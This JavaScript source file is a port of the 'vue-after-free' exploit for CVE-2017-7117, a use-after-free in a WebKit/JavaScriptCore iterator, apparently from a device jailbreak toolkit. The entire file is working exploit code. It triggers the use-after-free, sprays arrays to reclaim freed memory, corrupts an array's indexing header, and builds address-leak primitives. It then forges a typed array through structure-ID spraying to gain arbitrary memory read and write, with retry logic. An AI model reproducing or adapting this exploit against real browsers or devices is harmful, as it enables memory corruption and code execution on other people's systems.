//region VueAfterFree Entry Point (CVE-2017-7117)
// Port of Vuemony vue-after-free exploit
// https://github.com/Vuemony/vue-after-free
//
// Bootstrap strategy:
//   1. Trigger CVE-2017-7117 iterator confusion UAF via make_uaf(uaf_view)
//   2. The UAF frees uaf_view's backing buffer; spray JSArrays reclaim it
//   3. Scan uaf_view for marker pattern to find a spray array's butterfly
//   4. Corrupt the indexing header to change the array's length
//   5. Use structure ID spray to create a fake Uint32Array master
//   6. Set up arw.master, arw.victim, arw.leak_addr for full ARW

const VAF_SPRAY_SIZE = 0x100;

function vaf_make_uaf(arr) {
  const o = {};
  for (let i in { xx: "" }) {
    for (i of [arr]);
    o[i];
  }
}

async function init_vaf_rw() {
  arw.master = new Uint32Array(6);
  const MAX_VAF_ATTEMPTS = 3;

  for (let attempt = 1; attempt <= MAX_VAF_ATTEMPTS; attempt++) {
    try {
      logger.info(`Initiate VueAfterFree UAF (attempt ${attempt}/${MAX_VAF_ATTEMPTS})...`);
      logger.debug(`FW version: ${version}`);

      const marker = new BInt(0xFFFF0000, 0x13371337);

      const indexing_header = new BInt(VAF_SPRAY_SIZE, VAF_SPRAY_SIZE);

      const uaf_view = new DataView(new ArrayBuffer(0x100000));
      uaf_view.setUint32(0x10, 0xB0, true);

      logger.debug(`uaf_view size: 0x${uaf_view.byteLength.toString(16)}`);
      vaf_make_uaf(uaf_view);
      logger.info("Achieved UAF !!");

      for (let k = 0; k < 64; k += 8) {
        const val = uaf_view.getBInt(k, true);
        logger.debug(`pre-spray uaf_view[0x${k.toString(16)}]: lo=0x${val.lo.toString(16)} hi=0x${val.hi.toString(16)}`);
      }

      try {
        if (typeof gc === "function") {
          gc();
          logger.debug("GC triggered (expose-gc)");
        } else {
          const pressure = [];
          for (let p = 0; p < 0x40; p++) {
            pressure.push(new ArrayBuffer(0x100000));
          }
          pressure.length = 0;
          logger.debug("GC pressure applied (0x40 x 1MB buffers)");
        }
      } catch (gcErr) {
        logger.debug(`GC trigger skipped: ${gcErr.message}`);
      }

      const spray = new Array(0x2000);
      for (let i = 0; i < spray.length; i++) {
        spray[i] = new Array(VAF_SPRAY_SIZE).fill(0x13371337);
      }
      logger.debug(`Sprayed ${spray.length} arrays of size ${VAF_SPRAY_SIZE}`);

      for (let k = 0; k < 128; k += 8) {
        const val = uaf_view.getBInt(k, true);
        logger.debug(`post-spray uaf_view[0x${k.toString(16)}]: lo=0x${val.lo.toString(16)} hi=0x${val.hi.toString(16)}`);
      }

      let marked_arr_offset = -1;
      let corrupted_arr_idx = -1;

      for (let i = 8; i < uaf_view.byteLength; i += 16) {
        if (uaf_view.getBInt(i - 8, true).eq(indexing_header) &&
          uaf_view.getBInt(i, true).eq(marker)) {
          logger.debug(`Found marker at uaf_view offset 0x${i.toString(16)} !!`);
          marked_arr_offset = i - 8;
          break;
        }
      }

      if (marked_arr_offset === -1) {
        logger.debug("Primary scan failed, trying relaxed scan (marker-only, step 8)...");
        for (let i = 8; i < uaf_view.byteLength; i += 8) {
          if (uaf_view.getBInt(i, true).eq(marker)) {
            logger.debug(`Found marker (relaxed) at uaf_view offset 0x${i.toString(16)} !!`);
            marked_arr_offset = i - 8;
            break;
          }
        }
      }

      if (marked_arr_offset === -1) {
        logger.debug("Relaxed scan failed, trying dual-marker scan...");
        const marker2 = new BInt(0x13371337, 0x13371337);
        for (let i = 8; i < uaf_view.byteLength; i += 8) {
          if (uaf_view.getBInt(i, true).eq(marker2)) {
            logger.debug(`Found dual-marker at uaf_view offset 0x${i.toString(16)} !!`);
            marked_arr_offset = i - 8;
            break;
          }
        }
      }

      if (marked_arr_offset === -1) {
        logger.error("Marker scan failed - UAF reclaim did not land in expected location");
        logger.debug("Dumping first 256 bytes for analysis:");
        for (let k = 0; k < 256; k += 8) {
          const val = uaf_view.getBInt(k, true);
          if (val.lo !== 0 || val.hi !== 0) {
            logger.debug(`  [0x${k.toString(16)}]: lo=0x${val.lo.toString(16)} hi=0x${val.hi.toString(16)}`);
          }
        }
        throw new Error("Failed to find marked array !!");
      }

      const ih = uaf_view.getBInt(marked_arr_offset, true);
      logger.debug(`Marked indexing header: lo=0x${ih.lo.toString(16)} hi=0x${ih.hi.toString(16)}`);

      const corrupted_indexing_header = new BInt(0x1337, 0x1337);
      uaf_view.setBInt(marked_arr_offset, corrupted_indexing_header, true);

      for (let i = 0; i < spray.length; i++) {
        if (spray[i].length === 0x1337) {
          logger.debug(`Found corrupted array at spray[${i}], length=0x${spray[i].length.toString(16)}`);
          corrupted_arr_idx = i;
          break;
        }
      }

      if (corrupted_arr_idx === -1) {
        logger.error("No corrupted array found - indexing header corruption did not propagate");
        throw new Error("Failed to find corrupted array !!");
      }

      const marked_arr_obj_offset = marked_arr_offset + 0x10;

      arw.victim.setUint32(0, 0x13371337, true);

      const leak_obj = { obj: arw.victim };
      spray[corrupted_arr_idx][1] = leak_obj;
      const leak_obj_addr = uaf_view.getBInt(marked_arr_obj_offset, true);
      logger.debug(`leak_obj_addr: 0x${leak_obj_addr.d.toString(16)}`);

      arw.leak = leak_obj;
      arw.leak_addr = leak_obj_addr;
      logger.debug(`arw.leak_addr: 0x${arw.leak_addr.d.toString(16)}`);

      const u32_structs = new Array(0x100);
      for (let i = 0; i < u32_structs.length; i++) {
        u32_structs[i] = new Uint32Array(1);
        u32_structs[i][`spray_${i}`] = 0x1337;
      }
      logger.debug(`Sprayed ${u32_structs.length} Uint32Array structs for structure ID scan`);

      const length_and_flags = new BInt(1, 0x30);
      let master = undefined;
      let master_addr = new BInt(0);

      const rw_obj = {
        js_cell: new BInt(0, 0).d,
        butterfly: null,
        vector: arw.victim,
        length_and_flags: length_and_flags.d,
      };

      let structure_id = 0x80;
      while (!(master instanceof Uint32Array)) {
        const js_cell = new BInt(
          0x00 | (0x23 << 8) | (0xE0 << 16) | (0x01 << 24),
          structure_id++
        );

        rw_obj.js_cell = js_cell.jsv();
        spray[corrupted_arr_idx][1] = rw_obj;

        const rw_obj_addr = uaf_view.getBInt(marked_arr_obj_offset, true);
        master_addr = rw_obj_addr.add(0x10);

        uaf_view.setBInt(marked_arr_obj_offset, master_addr, true);
        master = spray[corrupted_arr_idx][1];
      }

      if (!(master instanceof Uint32Array)) {
        logger.error(`Structure ID scan exhausted (0x80-0x${structure_id.toString(16)}) without finding Uint32Array match`);
        throw new Error("Failed to find matching structure_id !!");
      }

      logger.info(`Found matching structure_id: 0x${(structure_id - 1).toString(16)} (decimal: ${structure_id - 1})`);
      arw.master = master;
      logger.debug(`arw.master type: ${arw.master.constructor.name}, length: ${arw.master.length}`);

      const slave_addr = arw.addrof(arw.victim);
      logger.debug(`slave_addr (arw.victim): 0x${slave_addr.d.toString(16)}`);

      arw.view(master_addr).setBInt(8, 0, true);
      arw.view(master_addr).setBInt(0x18, length_and_flags, true);

      arw.view(slave_addr).setUint8(6, 0xA0);
      arw.view(slave_addr).setInt32(0x18, -1, true);
      arw.view(slave_addr).setInt32(0x1C, 1, true);

      const slave_buf_addr = arw.view(slave_addr).getBInt(0x20, true);
      logger.debug(`slave_buf_addr: 0x${slave_buf_addr.d.toString(16)}`);
      arw.view(slave_buf_addr).setInt32(0x20, -1, true);

      logger.info("Achieved ARW !!");
      logger.debug(`ARW state: master=${arw.master.constructor.name} victim=${arw.victim.constructor.name} leak_addr=0x${arw.leak_addr.d.toString(16)}`);

      spray.length = 0;

      return undefined;
    } catch (e) {
      logger.error(`VAF attempt ${attempt} failed: ${e.message}`);

      if (attempt === MAX_VAF_ATTEMPTS) {
        throw new Error(`VueAfterFree failed after ${MAX_VAF_ATTEMPTS} attempts: ${e.message}`);
      }

      logger.info(`Retrying VAF in 500ms...`);
      await new Promise((r) => setTimeout(r, 500));
    }
  }
}
//#endregion
